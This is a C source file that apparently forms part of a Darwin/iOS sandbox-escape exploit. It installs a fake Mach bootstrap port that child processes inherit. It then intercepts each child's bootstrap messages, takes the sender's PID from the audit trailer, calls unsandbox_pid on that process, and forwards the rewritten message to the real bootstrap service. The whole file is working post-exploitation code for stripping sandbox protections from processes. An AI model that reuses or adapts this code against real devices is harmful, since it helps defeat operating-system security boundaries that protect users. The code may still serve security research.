#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#include <mach/mach.h>

#include "unsandboxer.h"
#include "disable_protections.h"

/*
 * Code mostly copied from the sandbox escape mitm :)
 * 
 * All children of the exploit process get a fake bootstrap port - we unsandbox
 * all senders to that bootstrap port
 */

static mach_port_right_t right_fixup(mach_port_right_t in) {
  switch (in) {
    case MACH_MSG_TYPE_PORT_SEND:
      return MACH_MSG_TYPE_MOVE_SEND;
    case MACH_MSG_TYPE_PORT_SEND_ONCE:
      return MACH_MSG_TYPE_MOVE_SEND_ONCE;
    case MACH_MSG_TYPE_PORT_RECEIVE:
      return MACH_MSG_TYPE_MOVE_RECEIVE;
    default:
      return 0; // no rights
  }
}

void do_bootstrap_mitm(mach_port_t real_bootstrap_port, mach_port_t fake_bootstrap_port) {
  mach_msg_size_t max_request_size = 0x10000;
  mach_msg_header_t* request = malloc(max_request_size);
  
  for(;;) {
    memset(request, 0, max_request_size);
    
    mach_msg_option_t options = MACH_RCV_MSG |
                                MACH_RCV_LARGE | // leave larger messages in the queue
                                MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |  // request an audit trailer identifying the sender
                                MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
    
    printf("waiting for message on fake bootstrap port\n");
    
    kern_return_t err = mach_msg(request,
                                 options,
                                 0,
                                 max_request_size,
                                 fake_bootstrap_port,
                                 0,
                                 0);
    
    if (err == MACH_RCV_TOO_LARGE) {
      // bump up the buffer size
      mach_msg_size_t new_size = request->msgh_size + 0x1000;
      request = realloc(request, new_size);
      // try to receive again
      continue;
    }
    
    if (err != KERN_SUCCESS) {
      printf("error receiving on fake bootstrap port: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
    
    mach_msg_audit_trailer_t* audit_trailer = (mach_msg_audit_trailer_t*) (((uint8_t*)request)+request->msgh_size);
    pid_t target_pid = audit_trailer->msgh_audit.val[5];
    printf("pid from trailer: %d\n", target_pid);
    
    printf("bootstrap port msgh_id: 0x%x\n", request->msgh_id);
    
    unsandbox_pid(target_pid);

    printf("got a request, fixing it up...\n");
    
    // fix up the message such that it can be forwarded:
    
    // get the rights we were sent for each port the header
    mach_port_right_t remote = MACH_MSGH_BITS_REMOTE(request->msgh_bits);
    mach_port_right_t voucher = MACH_MSGH_BITS_VOUCHER(request->msgh_bits);
    
    // fixup the header ports:
    // swap the remote port we received into the local port we'll forward
    // this means we're only mitm'ing in one direction - we could also
    // intercept these replies if necessary
    request->msgh_local_port = request->msgh_remote_port;
    request->msgh_remote_port = real_bootstrap_port;
    // voucher port stays the same
    
    int is_complex = MACH_MSGH_BITS_IS_COMPLEX(request->msgh_bits);
    
    // (remote, local, voucher)
    request->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, right_fixup(remote), right_fixup(voucher));
    
    if (is_complex) {
      request->msgh_bits |= MACH_MSGH_BITS_COMPLEX;
      
      // if it's complex we also need to fixup all the descriptors...
      mach_msg_body_t* body = (mach_msg_body_t*)(request+1);
      mach_msg_type_descriptor_t* desc = (mach_msg_type_descriptor_t*)(body+1);
      for (mach_msg_size_t i = 0; i < body->msgh_descriptor_count; i++) {
        switch (desc->type) {
          case MACH_MSG_PORT_DESCRIPTOR: {
            mach_msg_port_descriptor_t* port_desc = (mach_msg_port_descriptor_t*)desc;
            port_desc->disposition = right_fixup(port_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(port_desc+1);
            break;
          }
            
          case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
          case MACH_MSG_OOL_DESCRIPTOR: {
            mach_msg_ool_descriptor_t* ool_desc = (mach_msg_ool_descriptor_t*)desc;
            // make sure that deallocate is true; we don't want to keep this memory:
            ool_desc->deallocate = 1;
            desc = (mach_msg_type_descriptor_t*)(ool_desc+1);
            break;
          }

          case MACH_MSG_OOL_PORTS_DESCRIPTOR: {
            mach_msg_ool_ports_descriptor_t* ool_ports_desc = (mach_msg_ool_ports_descriptor_t*)desc;
            // make sure that deallocate is true:
            ool_ports_desc->deallocate = 1;
            ool_ports_desc->disposition = right_fixup(ool_ports_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(ool_ports_desc+1);
            break;
          }
        }
      }
      
    }
    
    printf("fixed up request, forwarding it\n");
    
    // forward the message:
    err = mach_msg(request,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   request->msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
      printf("error forwarding service message: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }
}

mach_port_t thread_real_bootstrap_port = MACH_PORT_NULL;
mach_port_t thread_fake_bootstrap_port = MACH_PORT_NULL;

void* do_bootstrap_mitm_thread(void* arg) {
  do_bootstrap_mitm(thread_real_bootstrap_port, thread_fake_bootstrap_port);
  return NULL;
}

pthread_t bootstrap_mitm_thread;
void start_bootstrap_mitm_thread(mach_port_t real_bootstrap_port, mach_port_t fake_bootstrap_port) {
  thread_real_bootstrap_port = real_bootstrap_port;
  thread_fake_bootstrap_port = fake_bootstrap_port;
  
  pthread_create(&bootstrap_mitm_thread, NULL, do_bootstrap_mitm_thread, NULL);
}

void start_bootstrap_unsandboxer() {
  mach_port_t real_bootstrap = MACH_PORT_NULL;
  task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &real_bootstrap);
  
  mach_port_t fake_bootstrap = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fake_bootstrap);
  mach_port_insert_right(mach_task_self(), fake_bootstrap, fake_bootstrap, MACH_MSG_TYPE_MAKE_SEND);
  
  start_bootstrap_mitm_thread(real_bootstrap, fake_bootstrap);
  
  // this will be inherited by all our child processes
  task_set_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, fake_bootstrap);
  start_bootstrap_mitm_thread(real_bootstrap, fake_bootstrap);
}
